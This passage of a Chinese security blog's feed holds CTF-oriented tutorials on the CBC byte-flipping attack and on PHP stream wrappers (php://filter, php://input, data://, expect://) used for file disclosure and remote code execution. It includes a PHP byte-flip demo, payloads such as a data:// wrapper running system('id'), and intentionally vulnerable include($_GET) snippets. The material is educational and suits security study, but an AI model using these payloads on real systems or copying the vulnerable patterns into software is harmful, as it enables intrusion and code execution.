<p>推荐练习平台：<br>汪神平台：<a href="https://www.jarvisoj.com/" target="_blank" rel="external">https://www.jarvisoj.com/</a><br><a href="http://ctf.bugku.com/" target="_blank" rel="external">http://ctf.bugku.com/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-Web&quot;&gt;&lt;a href=&quot;#0x01-Web&quot; class=&quot;headerlink&quot; title=&quot;0x01 Web&quot;&gt;&lt;/a&gt;0x01 Web&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;一、爆破，包括包括md5、爆破随机数、验证码识别等&lt;/li&gt;
&lt;li&gt;二、绕WAF，包括花式绕Mysql、绕文件读取关键词检测之类拦截&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;注入：http://103.238.227.13:10087/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;盲注：http://ctf5.shiyanbar.com/web/wonderkun/index.php&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;注入绕过：http://a.sql.bugku.com/web2/  提示 !,!=,=,+,-,^,%&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;http://web.jarvisoj.com:32787/&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="CTF" scheme="https://zjw.dropsec.xyz/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://zjw.dropsec.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CBC字节翻转攻击</title>
    <link href="https://zjw.dropsec.xyz/CTF/2017/04/24/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB.html"/>
    <id>https://zjw.dropsec.xyz/CTF/2017/04/24/CBC字节翻转攻击.html</id>
    <published>2017-04-24T01:51:18.000Z</published>
    <updated>2017-06-18T02:19:48.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-CBC翻转技术"><a href="#0x01-CBC翻转技术" class="headerlink" title="0x01 CBC翻转技术"></a>0x01 CBC翻转技术</h3><p>　　<a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation" target="_blank" rel="external">CBC</a>模式的全称是密文分组链接模式（Cipher Block Chainning)，之所以叫这个名字，是因为密文分组是像链条一样相互连接在一起的。<br><img src="http://i2.muimg.com/567571/0b694168b633add3.png" alt=""><a id="more"></a><br>　　在CBC模式中，首先将明文分组与前一个密文分组进行XOR运算，然后再进行加密，当加密第一个明文分组时，由于不存在“前一个密文分组”，因此需要事先准备一个长度为一个分组的比特序列来代替“前一个密文分组”，这个比特序列称为初始化向量（Initialization vector),通常缩写为IV,如果每次都使用相同的初始化向量（IV），当用同一密钥对同一明文进行加密时，所得到的密码一定是相同的，所以每次加密时都会随机产生一个不同的比特序列来作为初始化向量，避免这种情况产生。即：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">首先将明文分组(常见的以16字节为一组)，位数不足的使用特殊字符填充。</div><div class="line">生成一个随机的初始化向量(IV)和一个密钥。</div><div class="line">将IV和第一组明文异或。</div><div class="line">用密钥对3中xor后产生的密文加密。</div><div class="line">用4中产生的密文对第二组明文进行xor操作。</div><div class="line">用密钥对5中产生的密文加密。</div><div class="line">重复4-7，到最后一组明文。</div><div class="line">将IV和加密后的密文拼接在一起，得到最终的密文。</div></pre></td></tr></table></figure></p>
<p>加密公式：</p>
<ul>
<li><p>Ciphertext-0 = Encrypt(Plaintext XOR IV) —只用于第一个组块</p>
</li>
<li><p>Ciphertext-N = Encrypt(Plaintext XOR Ciphertext-N-1) —用于第二及剩下的组块<br>　　<br><img src="http://i2.muimg.com/567571/f24e769a0be02a4c.png" alt=""></p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">从密文中提取出IV，然后将密文分组。</div><div class="line">使用密钥对第一组的密文解密，然后和IV进行xor得到明文。</div><div class="line">使用密钥对第二组密文解密，然后和2中的密文xor得到明文。</div><div class="line">重复2-3，直到最后一组密文。</div></pre></td></tr></table></figure>
<p>解密公式：</p>
<ul>
<li><p>Plaintext-0 = Decrypt(Ciphertext) XOR IV—只用于第一个组块</p>
</li>
<li><p>laintext-N = Decrypt(Ciphertext) XOR Ciphertext-N-1—用于第二及剩下的组块</p>
</li>
</ul>
<h3 id="0x02-翻转攻击"><a href="#0x02-翻转攻击" class="headerlink" title="0x02 翻转攻击"></a>0x02 翻转攻击</h3><p>　　<strong>可以注意到Ciphertext-N-1用来产生下一块明文</strong>，这就是字节翻转攻击开始发挥作用的地方，如果我们改变Ciphertext-N-1中的一个字节，然后和下一块解密后的密文xor，就可以得到一个不同的明文，而这个明文是我们可以控制的。利用这一点，我们就欺骗服务端或者绕过过滤器。<br>　　CBC比特反转攻击的目的是攻击者通过修改密文来操纵解密后的明文，攻击者会对初始化向量（IV）中的任意比特位进行反转（1变0，0变1），则明文分组（解密后得到的明文分组）中相应的比特也会被反转。比如一个叫admin的用户，登录，经过CBC模式加密后，token为”aaabbbccc999”,现在有一个攻击者，叫john，登录，经过CBC模式加密后，token为cccbbbccc1111,现在john将token改为”ffcbbbccc1111”，发现登录名变成了ohn，所以他知道token第一个位的ff转换成了，经过几轮测试，他发现如果将token改为“7bcbbbccc1111”，则登录名变成了’aohn’，最后他通过发送token为7bdc995465到服务器，发现自己已经变成了admin。</p>
<p><img src="http://i4.buimg.com/567571/72106305bef82c9d.jpg" alt=""></p>
<p>　　根据解密流程，我们假设A为密文经过AES解密后的字串，B为前一组密文，C为明文：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">A = Decrypt(Ciphertext)[0] = 6</div><div class="line">B = (Ciphertext-N-1)[0] = 13</div><div class="line">C = Plaintext[0] = 11</div></pre></td></tr></table></figure></p>
<p>　　那么经过解密过程可知：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">C = A xor B</div></pre></td></tr></table></figure></p>
<p>　　那么<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">A xor B xor C = 0 (任何数与自己异或都为0)</div></pre></td></tr></table></figure></p>
<p>　　由于任何数与0异或都为自己本身，则<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">A xor B xor C xor 3 = 3</div></pre></td></tr></table></figure></p>
<p>　　那么此时我们可以这样来看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">A = A = 6</div><div class="line">B = B xor 3 = 13 xor 3 xor 11 = 5</div><div class="line">C = C = 11</div></pre></td></tr></table></figure></p>
<p>　　现在我们修改密文对应的位让B = 5，那么当密文解密后，会发现，明文C会变成3，通过这种方法我们可以控制任何一位明文。</p>
<h3 id="0x03-实例说明"><a href="#0x03-实例说明" class="headerlink" title="0x03 实例说明"></a>0x03 实例说明</h3><p>　　我们举例说明一下这个例子，这里有一个明文序列：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;sdsdsd&quot;;s:8:&quot;greeting&quot;;s:20:&quot;echo &apos;Hello sdsdsd!&apos;&quot;;&#125;</div></pre></td></tr></table></figure></p>
<p>　　我们的目标是将“s:6”当中的数字6转换成数字“7”。我们需要做的第一件事就是把明文分成16个字节的块：</p>
<ul>
<li>Block 1:a:2:{s:4:”name”;</li>
<li>Block 2:s:6:”sdsdsd”;s:8</li>
<li>Block 3::”greeting”;s:20</li>
<li>Block 4::”echo ‘Hello sd</li>
<li>Block 5:sdsd!’”;}</li>
</ul>
<p>　　我们需要更改的字符位于<strong>块２</strong>，因此我们需要改变<strong>块1</strong>的密文来改变<strong>块2</strong>的明文。在密文中改变的字节，只会影响到在下一明文当中，具有相同偏移量的字节。<br>　　因此我们只需要改变在第一个密文块当中，偏移量是2的字节。在第2行我们得到了整个数据的密文，然后在第3行中，我们改变块1中偏移量为2的字节，最后我们再调用解密函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$v = &quot;a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;sdsdsd&quot;;s:8:&quot;greeting&quot;;s:20:&quot;echo &apos;Hello sdsdsd!&apos;&quot;;&#125;&quot;;</div><div class="line">$enc = @encrypt($v);</div><div class="line">$enc[2] = chr(ord($enc[2]) ^ ord(&quot;6&quot;) ^ ord (&quot;7&quot;));</div><div class="line">$b = @decrypt($enc);</div></pre></td></tr></table></figure>
<p><img src="http://i2.muimg.com/567571/1ba83675efa713e6.png" alt=""><br>　　这样我们就把“s:6”当中的数字6转换成数字“7”，达到来了我们想要的目的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">define(&apos;MY_AES_KEY&apos;, &quot;abcdef0123456789&quot;);</div><div class="line">function aes($data, $encrypt) &#123;</div><div class="line">    $aes = mcrypt_module_open(MCRYPT_RIJNDAEL_128, &apos;&apos;, MCRYPT_MODE_CBC, &apos;&apos;);</div><div class="line">    $iv = &quot;1234567891234567&quot;;</div><div class="line">    mcrypt_generic_init($aes, MY_AES_KEY, $iv);</div><div class="line">    return $encrypt ? mcrypt_generic($aes,$data) : mdecrypt_generic($aes,$data);</div><div class="line">&#125;</div><div class="line"></div><div class="line">define(&apos;MY_MAC_LEN&apos;, 40);</div><div class="line"></div><div class="line">function encrypt($data) &#123;</div><div class="line">    return aes($data, true);</div><div class="line">&#125;</div><div class="line"></div><div class="line">function decrypt($data) &#123;</div><div class="line">    $data = rtrim(aes($data, false), &quot;\0&quot;);ss</div><div class="line">    return $data;</div><div class="line">&#125;</div><div class="line">$v = &quot;a:2:&#123;s:4:\&quot;name\&quot;;s:6:\&quot;sdsdsd\&quot;;s:8:\&quot;greeting\&quot;;s:20:\&quot;echo &apos;Hello sdsdsd!&apos;\&quot;;&#125;&quot;;</div><div class="line">echo &quot;Plaintext before attack: $v\n&quot;;</div><div class="line">$b = array();</div><div class="line">$enc = array();</div><div class="line">$enc = @encrypt($v);</div><div class="line">$enc[2] =  chr(ord($enc[2]) ^ ord(&quot;6&quot;) ^ ord (&quot;7&quot;));</div><div class="line">$b = @decrypt($enc);</div><div class="line">echo &quot;Plaintext AFTER attack : $b\n&quot;;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>参考链接：<br><a href="http://drops.wooyun.org/tips/4975" target="_blank" rel="external">使用CBC比特反转攻击绕过加密的会话令牌</a><br><a href="http://zke1ev3n.me/2015/12/15/CBC%E5%AD%97%E8%8A%82%E5%8F%8D%E8%BD%AC%E6%94%BB%E5%87%BB/" target="_blank" rel="external">CBC字节反转攻击</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-CBC翻转技术&quot;&gt;&lt;a href=&quot;#0x01-CBC翻转技术&quot; class=&quot;headerlink&quot; title=&quot;0x01 CBC翻转技术&quot;&gt;&lt;/a&gt;0x01 CBC翻转技术&lt;/h3&gt;&lt;p&gt;　　&lt;a href=&quot;https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation&quot;&gt;CBC&lt;/a&gt;模式的全称是密文分组链接模式（Cipher Block Chainning)，之所以叫这个名字，是因为密文分组是像链条一样相互连接在一起的。&lt;br&gt;&lt;img src=&quot;http://i2.muimg.com/567571/0b694168b633add3.png&quot; alt=&quot;&quot;&gt;
    
    </summary>
    
      <category term="CTF" scheme="https://zjw.dropsec.xyz/categories/CTF/"/>
    
    
      <category term="密码学" scheme="https://zjw.dropsec.xyz/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
      <category term="CTF" scheme="https://zjw.dropsec.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>PHP伪协议</title>
    <link href="https://zjw.dropsec.xyz/%E4%BB%A3%E7%A0%81/2017/04/09/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE.html"/>
    <id>https://zjw.dropsec.xyz/代码/2017/04/09/PHP伪协议.html</id>
    <published>2017-04-09T04:38:31.000Z</published>
    <updated>2017-04-09T05:25:12.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="PHP协议-封装协议"><a href="#PHP协议-封装协议" class="headerlink" title="PHP协议/封装协议"></a>PHP协议/封装协议</h3><table>
<thead>
<tr>
<th>包装或协议</th>
<th style="text-align:center">控制能力</th>
<th style="text-align:right">allow_url_include</th>
<th style="text-align:right">漏洞类型</th>
<th style="text-align:right">备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>file://</td>
<td style="text-align:center">-</td>
<td style="text-align:right">Off</td>
<td style="text-align:right">LFI /文件操作</td>
</tr>
<tr>
<td>glob://</td>
<td style="text-align:center">-</td>
<td style="text-align:right">Off</td>
<td style="text-align:right">目录遍历</td>
</tr>
<tr>
<td>php://filter/read</td>
<td style="text-align:center">include</td>
<td style="text-align:right">Off</td>
<td style="text-align:right">文件泄露</td>
<td style="text-align:right">PHP：//filter/read=convert.base64-encode/resource=index.php</td>
</tr>
<tr>
<td>php://filter/write</td>
<td style="text-align:center">file_put_contents</td>
<td style="text-align:right">Off</td>
<td style="text-align:right">编码</td>
<td style="text-align:right">file_put_contents(“php://filter/write=string.rot13/resource=x.txt”,”content”);</td>
</tr>
<tr>
<td>php://input</td>
<td style="text-align:center">include</td>
<td style="text-align:right">On</td>
<td style="text-align:right">RCE</td>
<td style="text-align:right">Encoding is required while reading .php source: &lt;?php echo base64_encode(file_get_contents(“solution.php”));?&gt; OR just use &lt;?php system(‘cat x.php’);?&gt;</td>
</tr>
<tr>
<td>data://</td>
<td style="text-align:center">include</td>
<td style="text-align:right">On</td>
<td style="text-align:right">RCE</td>
<td style="text-align:right">data:text/plain,&lt;?php system(“id”)?&gt; OR data:text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpPz4=</td>
</tr>
<tr>
<td>zip://</td>
<td style="text-align:center">include + uploaded file</td>
<td style="text-align:right">Off</td>
<td style="text-align:right">RCE</td>
</tr>
<tr>
<td>phar://</td>
<td style="text-align:center">include + uploaded file</td>
<td style="text-align:right">Off</td>
<td style="text-align:right">RCE</td>
<td style="text-align:right">PHP版本&gt; = 5.3</td>
</tr>
</tbody>
</table>
<a id="more"></a>
<p>php中支持的伪协议</p>
<pre><code>file:// — 访问本地文件系统
http:// — 访问 HTTP(s) 网址
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流（I/O streams）
zlib:// — 压缩流
data:// — 数据（RFC 2397）
glob:// — 查找匹配的文件路径模式
phar:// — PHP 归档
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — 音频流
expect:// — 处理交互式的流
</code></pre><p>这里可以参考<a href="http://php.net/manual/zh/wrappers.php" target="_blank" rel="external">官方文档</a>进行查看。而遇见最多的也就是php://协议了：</p>
<ul>
<li>php://stdin<br>主要用于php cli的输入</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">while($line = fopen(&apos;php://stdin&apos;,&apos;r&apos;))&#123;  </div><div class="line">    echo fgets($line);  </div><div class="line">&#125;  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://i4.buimg.com/567571/f0b778051856c477.jpg" alt=""></p>
<ul>
<li>php://stdout<br>主要用于php cli的输入<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$fh = fopen(&apos;php://stdout&apos;, &apos;w&apos;);  </div><div class="line">fwrite($fh, &quot;标准输出php://stdout\n&quot;);  </div><div class="line">fclose($fh);  </div><div class="line">fwrite(STDOUT, &quot;标准输出STDOUT\n&quot;);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="http://i4.buimg.com/567571/e62036bab64c514b.jpg" alt=""></p>
<ul>
<li>php://input<br>可以读取到post没有解析的原始数据<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line"> echo file_get_contents($_GET[&quot;a&quot;]);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="http://i4.buimg.com/567571/caba05f9460d9dbe.jpg" alt=""><br>当php代码换成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$code = $_GET[&apos;a&apos;];  </div><div class="line">include($code);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>而且当php远程包含打开的时候（当allow_url_include=on),就可以造成任意代码执行。<br><img src="http://i4.buimg.com/567571/52bcb6ca96711975.jpg" alt=""></p>
<ul>
<li>php://output<br>是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line"> $code=$_GET[&quot;a&quot;];  </div><div class="line"> file_put_contents($code,&quot;test&quot;);   </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="http://i4.buimg.com/567571/ab8f21052b4e2890.jpg" alt=""></p>
<ul>
<li>php://filter<br>是一种元封装器， 设计用于数据流打开时的筛选过滤应用<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$filename=$_GET[&quot;a&quot;];  </div><div class="line">$data=&quot;test&quot;;  </div><div class="line">file_put_contents($filename, $data);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>?a=php://filter/write=string.tolower/resource=test.php<br>可以往服务器中写入一个文件内容全为小写且文件名为test.php的文件：<br>其中 ：<br>（1）string.tolower //写入内容全部变成小写<br>（2）string.toupper //写入内容全部变成大写<br>（3）string.rot13 //写入内容全部对字符串执行 ROT13 编码<br>通过：?a=php://filter/convert.base64-encode/resource=test.php<br>可以往服务器中写入一个文件内容为base64编码且文件名为test.php的文件<br><img src="http://i2.muimg.com/567571/f80e4710de9ee31d.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$filename=$_GET[&quot;a&quot;];  </div><div class="line">echo file_get_contents($filename);  </div><div class="line">?&gt; </div><div class="line"></div><div class="line">&lt;?php  </div><div class="line">$filename=$_GET[&quot;a&quot;]; </div><div class="line">include(&quot;$filename&quot;);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>?a=php://filter/convert.base64-encode/resource=test.php,就可以把test.php的内容以base64编码的方式显示出来</p>
<p>双引号包含的变量$filename，可以当成正常变量执行，而单引号包裹的变量则会当成字符串</p>
<ul>
<li>expect://<br>可以用这个协议执行任意linux的指令<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$code = $_GET[&apos;hax&apos;];  </div><div class="line">include($code);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>那么可以用?hax=expect://command 来执行任意linux指令，但是：<br>Note:该封装协议默认未开启<br>为了使用 expect:// 封装器，你必须安装» PECL 上的 » Expect扩展。</p>
<ul>
<li>data://<br>数据流封装器<br>当allow_url_include 打开的时候，任意文件包含就会成为任意命令执行<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$filename=$_GET[&quot;a&quot;];  </div><div class="line">include(&quot;$filename&quot;);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="http://i4.buimg.com/567571/19570d7acea8b8a7.jpg" alt=""></p>
<p>参考链接：<br><a href="http://blog.csdn.net/niexinming/article/details/52605144" target="_blank" rel="external">http://blog.csdn.net/niexinming/article/details/52605144</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;PHP协议-封装协议&quot;&gt;&lt;a href=&quot;#PHP协议-封装协议&quot; class=&quot;headerlink&quot; title=&quot;PHP协议/封装协议&quot;&gt;&lt;/a&gt;PHP协议/封装协议&lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;包装或协议&lt;/th&gt;
&lt;th style=&quot;text-align:center&quot;&gt;控制能力&lt;/th&gt;
&lt;th style=&quot;text-align:right&quot;&gt;allow_url_include&lt;/th&gt;
&lt;th style=&quot;text-align:right&quot;&gt;漏洞类型&lt;/th&gt;
&lt;th style=&quot;text-align:right&quot;&gt;备注&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;file://&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;-&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;Off&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;LFI /文件操作&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;glob://&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;-&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;Off&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;目录遍历&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;php://filter/read&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;include&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;Off&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;文件泄露&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;PHP：//filter/read=convert.base64-encode/resource=index.php&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;php://filter/write&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;file_put_contents&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;Off&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;编码&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;file_put_contents(“php://filter/write=string.rot13/resource=x.txt”,”content”);&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;php://input&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;include&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;On&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;RCE&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;Encoding is required while reading .php source: &amp;lt;?php echo base64_encode(file_get_contents(“solution.php”));?&amp;gt; OR just use &amp;lt;?php system(‘cat x.php’);?&amp;gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;data://&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;include&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;On&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;RCE&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;data:text/plain,&amp;lt;?php system(“id”)?&amp;gt; OR data:text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpPz4=&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;zip://&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;include + uploaded file&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;Off&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;RCE&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;phar://&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;include + uploaded file&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;Off&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;RCE&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;PHP版本&amp;gt; = 5.3&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
    
    </summary>
    
      <category term="代码" scheme="https://zjw.dropsec.xyz/categories/%E4%BB%A3%E7%A0%81/"/>
    
    
      <category term="php" scheme="https://zjw.dropsec.xyz/tags/php/"/>
    
  </entry>
  
</feed>
